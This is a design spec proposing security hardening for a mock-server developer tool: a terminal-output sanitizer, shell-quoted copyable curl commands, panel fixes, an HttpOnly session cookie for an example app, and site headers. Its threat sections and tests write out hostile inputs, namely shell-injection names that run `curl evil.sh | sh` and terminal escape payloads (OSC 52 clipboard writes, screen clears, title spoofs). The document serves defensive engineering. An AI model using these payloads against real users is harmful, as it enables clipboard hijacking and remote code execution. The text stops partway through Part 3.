---
title: UI surfaces hardening — design spec
---

# UI surfaces hardening — design spec

**Status:** proposed, not implemented.
**Date:** 2026-10-12
**Ticket:** NIW2-316 — [Sanitize terminal output and harden editor, example app and site](https://linear.app/niway/issue/NIW2-316) (umbrella NIW2-302)

Normative statements use **must** / **must not**. Code blocks marked _illustrative_ show intent, not final declarations. Every `file:line` cites the read-only export of `origin/main` taken on 2026-10-12; where the audit (written against `feat/hero-demo`) and main differ, the difference is stated. Claims not checked in code or by running something are marked **unverified**.

## In one minute

**Summary.** Four surfaces print or embed text that laqi does not control, and three of them do it without a boundary. The terminal renderer (`@laqi/tui`) prints file names, parse messages and file excerpts from whatever repository the developer cloned, so a mock file can carry an escape sequence that clears the screen, spoofs the window title or writes the clipboard (OSC 52); open PR #56 adds a per-request row that would print a value taken from an HTTP header, reachable through `--share`. The panel builds a copy-paste `curl` command from unquoted mock data, submits the create form from any focused button on Enter, re-renders the whole app per request event, re-parses every body per keystroke and never resyncs after the SSE stream drops. The example app stores a bearer token in a JavaScript-readable cookie and parses it with a cast. laqi.dev sends no security headers and still ships seven dead components. This spec defines one sanitizer contract owned by `@laqi/tui` and applied inside every renderer, fixes the four panel problems in `packages/editor` only, moves the example's session into a cookie the mock sets with `HttpOnly`, and adds a `_headers` file that Cloudflare Workers static assets apply at the edge.

**Decisions.**

| #   | Decision                                                                                                                                                                                                           | Why                                                                                                                                                            | ADR                                            |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
| 1   | One sanitizer, owned by `@laqi/tui`, applied **inside every exported renderer** (`renderFailure`, `row`, `startScreen`, `goodbyeScreen`, and PR #56's `requestRow`). Callers never pre-sanitize and never need to. | Every output path converges there; a boundary at the sources (core, cli, server) would have to be repeated per source and would miss the next one.             | creates ADR-0025 _terminal sanitizer boundary_ |
| 2   | Control characters become **visible stand-ins** (`␛` U+241B for ESC, `␇` for BEL, `␡` for DEL, U+FFFD otherwise); never silently dropped.                                                                          | The reader sees that the file carried something odd; width stays measurable; no line is hidden.                                                                | same ADR                                       |
| 3   | Renderers are the only painters: `row()` takes raw text plus a colour token (a `Segment`), not a pre-painted string. `paint()` stays exported for literals only.                                                   | Removes the ambiguity "is this ESC ours or theirs?" that forces an SGR passthrough, which an attacker can abuse to hide text.                                  | same ADR                                       |
| 4   | Every value interpolated into a copyable shell command in the panel is POSIX single-quoted by one helper (`packages/editor/src/shell.ts`).                                                                         | Response names, paths and addresses come from the cloned repo and from the server; a `<pre>` presented as "run this" is a command.                             | none                                           |
| 5   | Enter submits the create row only from a text input; a submit in flight makes further submits no-ops.                                                                                                              | Buttons already act on Enter; the row-level handler doubled it (Cancel created, Create created twice).                                                         | none                                           |
| 6   | Request events are coalesced into one `setState` per animation frame in a log store; `EndpointRow` is memoized; filter and override counts are memoized.                                                           | A polling client re-rendered header, list and log per request.                                                                                                 | none                                           |
| 7   | The panel refetches on every SSE reopen after the first and shows a "disconnected" band on `error`; no server-side event ids.                                                                                      | Events are not replayable by design (`packages/core/src/events.ts:27-30`), the stream is owned by NIW2-309.                                                    | none                                           |
| 8   | The example app's session is set by the **mock** via `Set-Cookie: …; HttpOnly; SameSite=Lax; Path=/`; the client keeps only the non-secret user.                                                                   | It is what OWASP says a session must look like, and it is the code people will copy. It also shows a laqi feature (response headers).                          | creates ADR-0026 _example app session cookie_  |
| 9   | laqi.dev security headers ship as `apps/site/public/_headers`, applied by Cloudflare Workers static assets; a strict `script-src` is phase 2.                                                                      | Native to the deploy target, no Worker code, no build-time CSP machinery. `frame-ancestors` cannot be set from a `<meta>` tag, so a header is required anyway. | none                                           |
| 10  | The seven dead site components and `lib/version.ts` are deleted in this ticket; `CodeWindow` takes tokens, not HTML.                                                                                               | The header's condition ("still unreferenced") is met today; the scanner in `scripts/site/documented-commands.test.ts` reads them.                              | none                                           |

**Open questions for the owner.**

1. **Stand-in glyph.** `␛` (Control Pictures block) is recommended because laqi already prints `⚡`, `─`, `✗`. The alternative is caret notation (`^[`), which survives terminals without Unicode fonts. Pick one; the contract is the same.
2. **Delete the dead site components now or on 2026-11-02?** Their headers say "on or after 2026-11-02 if still unreferenced". Recommended: now, in this ticket; the date was a courtesy and nothing references them. If you prefer to honour the date, step D2 below moves to a follow-up.
3. **Example app: cookie set by the mock (decision 8) or bearer-in-JS with warnings?** Decision 8 changes what the example teaches (no `Authorization: Bearer` header; the browser carries the cookie). The fallback — keep the bearer, validate the cookie, add `Secure` on https, add a loud comment — is in Alternatives. Decision 8 depends on NIW2-315 keeping `Set-Cookie` allowed in mock response headers.
4. **CSP phase 2.** A `script-src` without `'unsafe-inline'` needs hashes for Starlight's inline theme script (**unverified** that Starlight 0.37 emits one; Astro's own `security.csp` handles only the scripts Astro bundles). Ship phase 1 (headers that need no hashes) now; phase 2 when someone measures the hash situation.
5. **PR #56 ordering.** The sanitizer PR (step A) should land first and PR #56 rebase onto it, because `requestRow` is a renderer and must follow decision 1. If PR #56 merges first, step A must patch `stream.ts` as well.

**Out of scope.**

- Host/Origin/CSRF checks, panel response headers (CSP for `/__laqi`), SSE backpressure, request event timing: NIW2-309.
- Whether the server should reject an unknown `X-Laqi-Response` name before it reaches the event: NIW2-309/NIW2-314.
- Validation of response names, endpoint paths, `delay` ranges and response headers in the schema: NIW2-315.
- The excerpt builder's own limits (`buildExcerpt`) and symlink handling: NIW2-313.
- Dead `plans/` in `apps/documentation`, `verify` coverage, SHA-pinned actions and the deploy workflow: NIW2-312.
- The site's content (copy, chapters) and the docs app.
- A security sandbox for terminals: the terminal emulator decides what OSC 52 does; laqi only stops being the carrier.

## Vocabulary

| Term           | Meaning here                                                                                                                                                                 |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Untrusted text | Any string whose bytes laqi did not write as a literal: file names, file contents, parse messages (V8 embeds the source), config values, tunnel output, HTTP request fields. |
| Renderer       | An exported function of `@laqi/tui` that returns text destined for a terminal.                                                                                               |
| Segment        | `{ text, token }`: raw text plus the colour token the renderer should paint it with.                                                                                         |
| Stand-in       | The visible character a control character is replaced with.                                                                                                                  |
| C0 / C1        | Control characters U+0000–U+001F and U+0080–U+009F. ESC is C0; U+009B is the single-byte CSI introducer in C1.                                                               |

## Part 1 — Terminal output

### 1.1 Current behaviour on main

`@laqi/tui` has no function that removes anything. `paint()` (`packages/tui/src/palette.ts:57-63`) only adds SGR sequences; `displayWidth` (`packages/tui/src/layout.ts:26,53-79`) strips exactly those SGR sequences and counts every other code point as one or two columns, so a foreign escape both reaches the terminal and miscounts the rule.

Interpolated verbatim:

- `renderFailure` (`packages/tui/src/report.ts:46-73`): `headline` (:49), `evidence.file` via `location()` (:35-39, :52), every line of `evidence.excerpt` (:54), `cause` (:59), `remedy` commands (:65), `outcome` (:70).
- `row` (`packages/tui/src/layout.ts:93-98`): label and value.
- `startScreen` (`packages/tui/src/screens.ts:55-61`): `servingUrl`, `panelUrl`, `watching`; `goodbyeScreen` (:86-94): every `filesWritten[].file`.

Where the untrusted text comes from (CLI call sites on main):

- `apps/cli/src/index.ts:465-474` and `:501-514`: `headline` is `` `${error.file} failed to load` ``, `cause` is `error.message`, `evidence` carries `error.file` and `error.excerpt`. `error.message` is V8's parse message, which embeds a snippet of the source. Verified on Node v24.21.0: `JSON.parse('{"a":\x1b[2J}')` throws `Unexpected token '\u001b', "{"a":\u001b[2J}" is not valid JSON`. `error.excerpt` is raw source lines (`packages/core/src/json-position.ts:27-42`, `packages/core/src/loader.ts:110,126`).
- `apps/cli/src/index.ts:52-57` (config file is not JSON, `cause: error.message`) and `:65-72` (Zod issue paths and messages from `laqi.config.json`).
- `apps/cli/src/index.ts:482-497`: `watching` is `./${config.file}` or `./${config.dir}/`, both from `laqi.config.json` or flags.
- `apps/cli/src/index.ts:358-421` (`reportShare`): `url` from cloudflared, `share.origins` from config, each passed to `row()` already painted.
- `apps/cli/src/index.ts:519-524`: `main().catch` prints any error's message.
- `apps/cli/src/goodbye.ts:28`: `filesWritten` names come from the watcher.
- Raw `console.*` outside the renderer: `apps/cli/src/index.ts:164` (`laqi mcp — serving ${root}`), `apps/cli/src/migrate.ts:159,189` (warnings built from v1 file keys at `:34,45,68,86,92`), `apps/cli/src/init/run.ts:248` (**unverified** what it interpolates; it must go through the same rule).

Main did not change any of this relative to the audit; the audit's `report.ts:49,54,59`, `layout.ts:93-97`, `screens.ts:55-61,87-93` and `index.ts:454-470,500-506` map to the lines above (the index.ts offsets moved by about ten lines).

**PR #56** ([csdev19/laqi#56](https://github.com/csdev19/laqi/pull/56), branch `feat/terminal-request-stream`, open) adds `packages/tui/src/stream.ts` with `requestRow(row, level, columns)` that prints `method`, `path`, `resolvedName`, `resolvedLayer` with `padEnd`/`clamp` and no sanitizing, and a subscriber in `apps/cli/src/index.ts` that feeds it straight from the event bus. The values:

- `path` is `new URL(c.req.url).pathname` (`packages/server/src/mock-app.ts:48,112`). Verified on Node v24.21.0: a raw ESC in the request target is rejected by the HTTP parser (`HPE_INVALID_URL`), and a percent-encoded `%1b` stays encoded in `pathname` (`/a%1b[2Jb`). So on Node the path carries no raw control bytes. **Unverified** for Bun, which runs the CLI in development only.
- `resolvedName` on the header layer is the raw `X-Laqi-Response` value (`packages/core/src/resolve.ts:38`). Verified on Node v24.21.0: ESC and DEL in a header value are rejected (`HPE_INVALID_HEADER_TOKEN`), but the byte `0x9B` is accepted and decoded as U+009B, the C1 CSI introducer. A terminal that honours 8-bit C1 controls (**unverified** which current terminals do by default; xterm can) would interpret it. With `--share`, anyone with the URL (or the token) can send that header. The 500 body at `mock-app.ts:61` echoes the same name back to the client, which is NIW2-309's concern, not this one.
- `resolvedName` on every other layer is a response name from a mock file: untrusted by the same rule as the excerpts.

PR #56's `clamp` also slices by UTF-16 code unit (`text.slice(0, width - 1)`), which can split a surrogate pair after `displayWidth` judged the text too wide.

### 1.2 Threat

A developer clones a repository (or installs a shared "mock pack") and runs `npx laqi`. One mock file is not valid JSON and contains, in the failing line, `ESC ] 52 ; c ; <base64> BEL`. laqi prints the file name, V8's message (which quotes the line) and the three-line excerpt. The terminal, if it allows OSC 52 writes, now holds attacker text in the clipboard; the developer's next paste into a shell runs it. The same bytes can instead clear the screen and reprint a clean start screen so the failure is never seen, or set the window title. The Black Hat 2023 "weaponizing plain-text ANSI" appendix and the pickem and Warp advisories in References document each of these.

With PR #56 and `--share`, the same effect no longer needs a cloned repository: a request through the tunnel can place C1 bytes into `resolvedName`, and the next stage of the stream (user-agent family, "via public") would add further raw header values.

### 1.3 Designed behaviour

**The contract.** `@laqi/tui` is the trust boundary for the terminal. Text that enters a renderer is untrusted by definition; the renderer sanitizes it, then paints it, then measures it. Nothing outside `@laqi/tui` needs to know which strings are dangerous.

Normative rules:

1. `@laqi/tui` **must** export `sanitize(text: string): string` from `packages/tui/src/sanitize.ts`, re-exported from `packages/tui/src/index.ts`.
2. `sanitize` **must** replace every code point in these sets: C0 except U+0009 (TAB) and U+000A (LF); U+007F; C1 (U+0080–U+009F); U+2028 and U+2029; the bidirectional override and isolate controls U+202A–U+202E and U+2066–U+2069. U+000D (CR) is in the replaced set: a lone CR lets a line overwrite the previous one.
3. The replacement **must** be visible: U+0000–U+001F map to U+2400 + code (`␛` for ESC, `␇` for BEL, `␍` for CR), U+007F to `␡` (U+2421), and everything else to U+FFFD. `sanitize` **must** be idempotent and **must not** drop characters, so a reader can still see the shape of what was there.
4. `sanitize` **must not** truncate, wrap or measure. Width and length belong to layout.
5. Every exported renderer (`renderFailure`, `row`, `rule` if it ever takes caller text, `startScreen`, `goodbyeScreen`, `requestRow`, `keysLine`) **must** apply `sanitize` to every string field of its input before painting or measuring it. The glyph table, labels and the farewell are literals and are exempt.
6. Renderers **must** paint; callers **must not**. `row` **must** accept `string | Segment | readonly Segment[]` for its value, where a bare string paints as `'value'`. The current callers that pass painted strings (`packages/tui/src/screens.ts:55-61,78-94`, `apps/cli/src/index.ts:363-419`) migrate to segments in the same change. `paint()` stays exported, documented as "for text laqi wrote itself"; a renderer that receives a string containing `\x1b` treats it like any other control character, so a caller that still pre-paints sees `␛[38;2;…m` in its output, which is the failure made visible rather than hidden.
7. `renderFailure` **must** clamp each excerpt line to the usable width (`usableWidth(columns) - INDENT.length`) with an ellipsis, by code point, never by UTF-16 unit. `renderFailure` gains an optional `columns?: number` parameter, like the screens. The clamp helper lives in `packages/tui/src/layout.ts` and PR #56's `clamp` **must** become a call to it.
8. The raw `console.*` sites that print untrusted text without a renderer (`apps/cli/src/index.ts:164`, `apps/cli/src/migrate.ts:159,189`, `apps/cli/src/init/run.ts:248` if it interpolates data) **must** either route through a renderer or wrap the text in `sanitize`. A test over `apps/cli/src/**/*.ts` listing the allowed raw `console.*` calls is cheap and keeps the next one honest.
9. `displayWidth` keeps stripping `paint()`'s SGR sequences (it measures what renderers produce), and gains nothing else.
10. `design/terminal-output.md` **must** gain a "Trust boundary" section stating rules 1, 5 and 6 and listing which fields are untrusted; `packages/server` keeps its zero-`node:*` rule and does not import `@laqi/tui`.

What is deliberately **not** done: `sanitizePainted` (strip everything except SGR). Letting any SGR through lets an attacker paint a line black-on-black or use SGR 8 (conceal) to hide the "failed to load" line; rule 6 makes it unnecessary.

**PR #56 integration.** `requestRow` sanitizes `method`, `path`, `resolvedName`, `resolvedLayer` and `time` before padding; `clamp` moves to layout and slices by code point; `keysLine` has no caller text. The subscriber in `apps/cli/src/index.ts` passes event fields through unchanged, which is the point of rule 1. Decision 5 of the open questions decides which PR carries the diff.

### 1.4 Interfaces (illustrative)

```ts
// packages/tui/src/sanitize.ts — illustrative
const UNSAFE =
  /[\u0000-\u0008\u000b-\u001f\u007f-\u009f  ‪-‮⁦-⁩]/gu

export function sanitize(text: string): string {
  return text.replace(UNSAFE, (char) => {
    const code = char.codePointAt(0)!
    if (code <= 0x1f) return String.fromCodePoint(0x2400 + code)
    if (code === 0x7f) return '␡'
    return '�'
  })
}

// packages/tui/src/layout.ts — illustrative additions
export type Segment = { text: string; token: Token }

export function row(label: string, value: string | Segment | readonly Segment[], level: Level): string
// label: sanitize, paint 'label', pad to LABEL_WIDTH
// value: normalise to Segment[], sanitize each text, paint each with its token, join

export function clamp(text: string, width: number): string
// counts with displayWidth, cuts with [...text] (code points), appends '…'

// packages/tui/src/report.ts — illustrative
export function renderFailure(failure: Failure, level: Level, columns?: number): string
```

### 1.5 Migration and compatibility

- No change to mock files, config, the HTTP surface or the npm package's dependency list (`apps/cli/src/package.test.ts` keeps passing; the sanitizer is forty lines in a private workspace package bundled by tsdown).
- Terminal output changes only when input contained a control character: the reader sees `␛` where before the terminal executed something. Output piped to CI logs and agents (level `none`) becomes strictly cleaner.
- `row()`'s signature changes for callers inside the monorepo only (`apps/cli`). `@laqi/tui` is `private: true`.
- PR #56 needs a rebase (five lines in `stream.ts`).

### 1.6 Tests

`packages/tui/src/sanitize.test.ts`

- `replaces ESC and BEL with visible stand-ins`: input `'\x1b]52;c;ZXZpbA==\x07'` → `'␛]52;c;ZXZpbA==␇'`.
- `neutralises C1, DEL, lone CR and bidi overrides`: `'a\x9b2Jb\x7fc\rd‮e'` → `'a�2Jb␡c␍d�e'`.
- `keeps TAB, LF and ordinary Unicode`: `'a\tb\nc ⚡ 日本'` unchanged.
- `is idempotent`: `sanitize(sanitize(x)) === sanitize(x)` for the three inputs above.

`packages/tui/src/report.test.ts` (new cases)

- `leaves no control character in any caller-supplied field`: a `Failure` whose headline, cause, file, excerpt, remedy and outcome each contain `'\x1b]52;c;ZXZpbA==\x07'` and `'\x1b[2J\x1b[H'`; at level `'none'` the output matches `/^[^\x00-\x08\x0b-\x1f\x7f-\x9f]*$/u` and contains `'␛]52;c;ZXZpbA==␇'`.
- `keeps the newlines of a multi-line excerpt`: excerpt `'one\ntwo'` → output contains `'  one\n  two'`.
- `clamps an excerpt line to the width by code point`: a 300-column line of `'日'` with `columns: 80` → every output line has `displayWidth <= 80` and ends with `'…'`, and `[...line].length` is consistent (no lone surrogate).
- `still colours only what it painted`: at level `'truecolor'`, with hostile fields, every `\x1b` in the output is immediately followed by `[38;2;`, `[38;5;` or `[0m`.

`packages/tui/src/layout.test.ts` (new cases)

- `row paints a bare string as a value and sanitizes it`: `row('serving', 'http://x\x1b[2J', 'none')` → `'serving     http://x␛[2J'`.
- `row paints each segment with its token`: `row('watching', [{ text: './laqi/', token: 'value' }, { text: ' 7 endpoints', token: 'dim' }], 'truecolor')` → contains both colour prefixes and no third `\x1b`.
- `row treats a pre-painted value as hostile`: `row('x', paint('y', 'accent', 'truecolor'), 'none')` → contains `'␛[38;2;'` (the regression a forgetful caller would see).

`packages/tui/src/screens.test.ts` (new cases)

- `start and goodbye screens neutralise file names and URLs`: `StartInfo` with `watching: './\x1b[2J/'`, `GoodbyeInfo` with `filesWritten: [{ file: '\x1b]0;owned\x07a.json', times: 1 }]`; neither output contains `\x1b` or `\x07` at level `'none'`.

`packages/tui/src/stream.test.ts` (in PR #56 or step A, whichever lands second)

- `requestRow neutralises a C1 byte in the resolved name`: `resolvedName: 'ok\x9b2J'` → output contains `'ok�2J'`, no U+009B.
- `requestRow clamps a long path by code point`: path of 200 `'日'`, `columns: 80` → no lone surrogate, ends with `'…'`.

`apps/cli/src/index.test.ts` (end-to-end, using the existing `runUntil` spawn helper at `:63`)

- `a mock file carrying an escape sequence cannot reach the terminal`: write `laqi/evil.json` with content `'{"GET /a": \x1b]52;c;ZXZpbA==\x07}'` and a valid `laqi/ok.json`; run `laqi start --port 0`; stdout and stderr combined match `/^[^\x1b\x07]*$/` (the child is not a TTY, so level is `none` and no `\x1b` is legitimate) and contain `'evil.json failed to load'` and `'␛]52'`.
- `a config file carrying an escape sequence cannot reach the terminal`: `laqi.config.json` = `'{"dir": "\x1b[2J"'` (invalid JSON); same assertion on stderr.
- `raw console calls in apps/cli are the listed ones`: reads `apps/cli/src/**/*.ts` (not tests), collects `console.(log|error|warn)(` calls whose first argument is not a template literal of literals, a renderer call, `USAGE`/`INIT_USAGE`, or wrapped in `sanitize(`; expects the set to equal an explicit allow-list. (A grep-shaped test; cheap and it names the rule.)

## Part 2 — Panel (`packages/editor`)

ADR-0011 is respected throughout: everything below is React 19 inside the existing Vite SPA; no router, no framework, no new runtime dependency (`shell.ts` is ten lines).

### 2.1 Copyable curl is not shell-quoted

**Current.** `curlFor` (`packages/editor/src/components/EndpointDetail.tsx:740-743`):

```ts
return `curl ${method}-H 'X-Laqi-Response: ${response}' http://${address}${endpoint.path}`
```

rendered in a `<pre class="meta-curl">` at `:610` as the way to test a response. `response` is a response name and `endpoint.path` a path, both from the mock files; `address` is `Status.address` from `/api/status` (`apps/cli/src/serve.ts:171`, from config). `ShareBand` (`packages/editor/src/components/ShareBand.tsx:13`) builds `curl -H 'Authorization: Bearer ${token}' ${url}/` and copies it to the clipboard at `:61`; `token` is server-generated hex and `url` comes from cloudflared, so that one is lower risk today but has the same shape. Unchanged since the audit.

**Threat.** A cloned repository's mock has a response named `x'; curl evil.sh | sh; '` or a path `/a;$(curl evil.sh|sh)`. The panel shows a ready command; the developer copies it into a terminal. The quote closes, the payload runs. Response-name grammar is NIW2-315's call; the panel must not rely on it.

**Designed behaviour.**

- `packages/editor/src/shell.ts` **must** export `shellQuote(value: string): string` that wraps the value in single quotes and rewrites each embedded `'` as `'\''`. Inside POSIX single quotes nothing else is special.
- Both curl builders **must** quote every interpolated value: the method (`-X 'PUT'` is harmless and uniform), the header (`-H 'X-Laqi-Response: <name>'` as one quoted argument), the URL (`'http://<address><path>'`), and the share URL.
- `curlFor` **must** be exported so it can be tested as a pure function. There **must** be one curl builder, in `shell.ts` or beside it, used by both components (the audit's Q7 duplication).
- The four `navigator.clipboard?.writeText` calls (`ShareBand.tsx:54,61`, `FreshProject.tsx`, `TypesPanel.tsx`) **must** go through one `copy(text)` helper that catches the rejection (non-secure contexts such as `--host` on a LAN name have no clipboard) so a blocked clipboard is not an unhandled promise rejection.

**Tests.** `packages/editor/src/shell.test.ts`: `wraps plain values` (`'/todos'` → `"'/todos'"`), `closes, escapes and reopens around an embedded quote` (`"x'; curl evil.sh | sh; '"` → `"'x'\\''; curl evil.sh | sh; '\\'''"`), `leaves expansions inert` (`'/a;$(id)`id`'` → quoted unchanged). `EndpointDetail.test.tsx`: `curlFor quotes hostile names and paths` with `{ method: 'GET', path: '/a;$(id)' }`, name `"x'; curl evil.sh | sh; '"`, address `'localhost:8000'` → exactly `curl -H 'X-Laqi-Response: x'\''; curl evil.sh | sh; '\''' 'http://localhost:8000/a;$(id)'`. `ShareBand.test.tsx`: the copied curl is `curl -H 'Authorization: Bearer <token>' '<url>/'`.

**Dependency.** NIW2-309 intends to stop returning the share token from `/api/status`. If it does, `ShareBand`'s curl drops the `-H` or the CLI becomes the only place that prints it; the quoting rule is unaffected. The two tickets touch different files (`packages/server` vs `packages/editor`), but `Share.token` in `packages/editor/src/types.ts:39-45` is the shared contract to agree on.

### 2.2 Enter on a focused button submits the create form

**Current.** `CreateEndpointRow.tsx:174-178`:

```tsx
onKeyDown={(event) => {
  const inTextarea = event.target instanceof HTMLTextAreaElement
  if (event.key === 'Enter' && !inTextarea) submit()
  if (event.key === 'Escape') props.onCancel()
}}
```

The wrapper handles keydown for every descendant. With focus on "Cancel" (`:244-246`), Enter runs `submit()` (keydown bubbles first) and then the button's click runs `onCancel`: an endpoint is created and the row closes. With focus on "Create" (`:241-243`) Enter runs `submit()` twice: one from keydown, one from the click the browser synthesises; the second POST fails as a duplicate and the error is shown over a successful create. Method and mode toggles (`:181-193`, `:225-238`) and the "Accept approximation" button in the model flow behave the same. The existing test `submits on Enter from an input` (`CreateEndpointRow.test.tsx:276`) covers the intended path only.

**Designed behaviour.**

- The row-level handler **must** submit on Enter only when `event.target` is an `HTMLInputElement` (and, if a `<select>` ever exists, not when it is a select). Buttons keep their native Enter → click.
- `submit()` **must** be a no-op while a previous submission is pending. `App` knows when `create`/`createFromModel`/`prepareModule` settle (`App.tsx:147-175`, `:178`, `:260-319`); the row gains a `pending: boolean` prop, and `submit()` returns early when it is true. Rapid double Enter inside an input is then one POST.
- Escape keeps cancelling from anywhere in the row.

**Tests** (`CreateEndpointRow.test.tsx`): `does not submit on Enter from a button` (keydown Enter on Create and on Cancel with a valid path → `onCreate` not called; a click on Create → called once); `ignores a second submit while one is pending` (render with `pending: true`, Enter in the path input → not called); `submits on Enter from an input` stays green.

### 2.3 The whole App re-renders per request event

**Current.** `App.tsx:93-115`: each `request` SSE event calls `setLog` on `App` (`:103`). `App` renders `Header`, the list and the log; `filterEndpoints` (`:385`) and `overriddenCount` (`:394`) run on every render; `EndpointRow` (`EndpointRow.tsx:5`) is not memoized, so `shown.map` (`:491-501`) re-renders every row; `appendLog` (`log.ts:32-34`) is a 200-element copy, which is fine. React batches events dispatched in one tick, but a sustained stream (a frontend polling, a load script) is one render per event. Unchanged since the audit.

**Designed behaviour.**

- Request entries **must** be queued and flushed into state at most once per animation frame (`requestAnimationFrame` when available, a 16 ms timer under jsdom), with `seq` still assigned at receive time (the comment at `App.tsx:98-101` explains why). A flush applies the whole batch with one `appendLog` fold.
- The log **should** live in its own store exposed through `useSyncExternalStore`, so that `RequestLog` subscribes to it and `App` does not re-render for a log change at all. If the implementer keeps `useState` in `App`, the per-frame flush is the minimum and the memoization below is mandatory.
- `EndpointRow` **must** be wrapped in `React.memo`; `flip`/`setDetailId` are already stable callbacks. `filterEndpoints` and `overriddenCount` **must** be `useMemo`'d on `[endpoints, filter]` and `[endpoints, state, scenarios]`.
- `paused` **must** drop events, not buffer them (today's semantics at `:97`).

**Tests** (`App.test.tsx`): `coalesces a burst of request events into one render of the list`: render with a counting `EndpointRow` (vi.mock or a render-count ref via a test id), emit 50 `request` events synchronously through the fake EventSource, advance fake timers one frame → the log shows 50 rows, the list rendered at most once more than before the burst. `log.test.ts`: `a batch fold keeps the cap and the order` (fold 250 entries → 200 kept, newest first).

### 2.4 Body re-parse per keystroke

**Current.** `EndpointDetail.tsx:105-110` builds `fingerprint = JSON.stringify([...endpoint.responses])` on every render (every keystroke, since the draft is state in the same component). `:137` runs `sameDefinition` (`:791-819`) on every draft change: it `JSON.parse`s every draft body and `JSON.stringify`s both sides. `ValidityReadout` (`JsonEditor.tsx:21-23`) runs `checkJson` on the full source per render. `CodeSurface.tsx:59` tokenizes the full value and emits one `<span>` per token, `:52` one gutter div per line. A 2 MB body means megabytes of parse/stringify and ~100k DOM nodes per keypress. Unchanged since the audit.

**Designed behaviour.**

- `fingerprint` **must** be memoized on `endpoint` identity (`useMemo(..., [endpoint])`): the draft changes per keystroke, the endpoint object does not.
- The dirty check and the validity readout **must** run against a deferred draft (`useDeferredValue`), so the keystroke paints before the parse, and stale checks are dropped while keys keep arriving.
- `CodeSurface` **must** skip tokenizing above a size threshold (`HIGHLIGHT_LIMIT = 200_000` characters, exported) and render the plain value in the paint layer; tokens and lines **must** be `useMemo`'d on `value`.
- Nothing changes in `highlight.ts`; the tokenizer's contract (never drops a character) stays as is.

**Tests.** `CodeSurface.test.tsx`: `paints plain text above the highlight limit` (value of `HIGHLIGHT_LIMIT + 1` chars → the paint layer has no `.tok-*` span and `tokenize` was not called). `EndpointDetail.test.tsx`: `does not rebuild the draft when the parent re-renders with the same endpoint object` (rerender with the same `endpoint` reference after typing → the typed text survives; today's behaviour, pinned so the memo cannot regress it) and `rebuilds the draft when the endpoint content changes` (existing behaviour at `:111-121`, pinned).

### 2.5 No SSE resync after reconnect

**Current.** `useEvents.ts:19-41` opens an `EventSource` and listens to the three event types; there is no `open` or `error` handler. The server stream (`packages/server/src/control-plane-app.ts:553-572`) sends no `id:`; the bus is explicitly not replayable (`packages/core/src/events.ts:27-30`). When the CLI restarts or the laptop sleeps, `EventSource` reconnects by itself, but any `endpoints-changed` or `error` emitted meanwhile is lost and the panel is stale until the user acts. Unchanged since the audit.

**Designed behaviour.**

- `useEvents(onEvent, onReconnect?)` **must** call `onReconnect` on every `open` after the first; `App` passes `scheduleRefresh` so the panel refetches endpoints, state, scenarios and status once per reopen.
- `useEvents` **must** expose the connection state (`'connecting' | 'open' | 'closed'`) and `App` **must** show a band ("control plane disconnected — reconnecting") while it is not open, in the same style as the fatal band at `App.tsx:398-410`. Requests during the gap are not in the log and the band says so.
- No `Last-Event-ID`: with no replay on the server there is nothing to resume. If NIW2-309 adds `retry:` to the stream, nothing here changes.

**Tests** (`useEvents.test.ts`, extending the `FakeEventSource` at `:15`): `calls onReconnect on a re-open but not on the first open` (emit `open` twice → called once); `reports the connection state` (`closed` → `open` after `open`, `closed` after `error`). `App.test.tsx`: `refetches after the stream reopens` (`getEndpoints` call count increases by one after the second `open`) and `shows a disconnected band on error`.

### 2.6 Noted, not in this ticket

- `api.ts:34-52`: a 200 with a non-JSON body throws a raw `SyntaxError` (audit Q3). One try/catch; worth folding into the first editor PR if touched, otherwise a follow-up.
- `EndpointDetail.tsx:586`: `delay` accepts any number (audit Q5). The bound belongs in the schema (NIW2-315); the input can clamp to it afterwards.
- `renameResponse` with `__proto__` (audit Q4) depends on NIW2-315's response-name grammar.

### 2.7 Migration and compatibility

Panel-only; nothing in the HTTP contract changes. The copied curl differs in quoting only. `useEvents`' new optional parameter is internal.

## Part 3 — Example app (`examples/todo-app`)

### 3.1 Current behaviour

`examples/todo-app/src/lib/auth.ts`:

- `:15-19` the cookie `laqi_demo_session` holds the whole `Session = { token, user }`.
- `:36-40` `writeSession` sets it from JavaScript with `path=/; max-age=28800; SameSite=Lax`: readable by any script on the origin, no `Secure`, no `HttpOnly` (impossible from `document.cookie`).
- `:28-33` `readSession` returns `JSON.parse(...) as Session` with no check.
- `src/lib/api.ts:52-54` attaches `Authorization: Bearer ${session.token}` to every request.
- `src/routes/login.tsx:39,44-49` inputs lack `autoComplete`.
- `src/routes/profile.tsx:18-25` signs out on a 401; `src/routes/__root.tsx:67` signs out on click.
- `laqi/api.json:9,27,44` the canned token `laqi-demo-token-6f4a91c2`.

The header comment at `:3-14` is honest ("FRONTEND MECHANISM, not security"), and it also says "Once the real backend shows up, the frontend doesn't change", which is the sentence that makes the file copyable as is. Unchanged since the audit.

### 3.2 Threat

A team copies `auth.ts` into their real app because it is the only auth example laqi ships ([examples](/design/examples/): "it stays the only auth example"). An XSS in any rendered field, or one compromised dependency, reads `document.cookie` and holds an eight-hour bearer token. Over plain HTTP in staging the cookie is also on the wire. OWASP's Session Management cheat sheet (References) calls `HttpOnly` and `Secure` mandatory for a session identifier and says not to keep tokens in JavaScript-reachable storage.

### 3.3 Designed behaviour (decision 8)

The example **must** show the shape OWASP describes, using laqi's own response headers to do it:

- `laqi/api.json`: `POST /auth/login` (`ok`) and `POST /auth/signup` (`ok`) **must** carry `"headers": { "Set-Cookie": "__Host-laqi_demo_session=laqi-demo-token-6f4a91c2; HttpOnly; Secure; SameSite=Lax; Path=/" }` on an https origin; because the demo runs on `http://localhost`, the committed mock uses `laqi_demo_session=…; HttpOnly; SameSite=Lax; Path=/` and the README states the `__Host-` + `Secure` form as what production sets. (Chromium and Firefox treat `localhost` as a secure context and store `Secure` cookies over http there — **unverified** for Safari — and the mock is also reached through `LAQI_URL` on other hosts; the README line is the safer teaching.) A new `POST /auth/logout` (`ok`, 204) **must** set the same cookie with `Max-Age=0`.
- The bodies of `login`/`signup` **must** return only `{ user }`; the token is no longer in a body, so the client never sees it. The server (laqi) does not verify anything, as today; the README says so.
